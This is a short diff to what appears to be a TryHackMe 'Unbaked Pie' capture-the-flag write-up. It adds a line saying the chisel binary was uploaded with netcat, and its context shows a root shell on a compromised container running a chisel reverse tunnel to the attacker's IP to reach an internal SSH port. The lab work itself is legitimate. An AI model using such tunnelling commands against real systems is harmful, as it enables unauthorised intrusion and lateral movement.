@@ -348,6 +348,7 @@ local@local:~/Documents/tryhackme/unbaked_pie$ sudo ./chisel server -p 1880 --re
 ```
 
 ### On remote box
+I uploaded the chisel binary on the container using netcat.
 ```console
 root@8b39a559b296:/home/site# ./chisel client 10.6.31.213:1880 R:22:172.17.0.1:22
 2020/12/03 12:42:00 client: Connecting to ws://10.6.31.213:1880
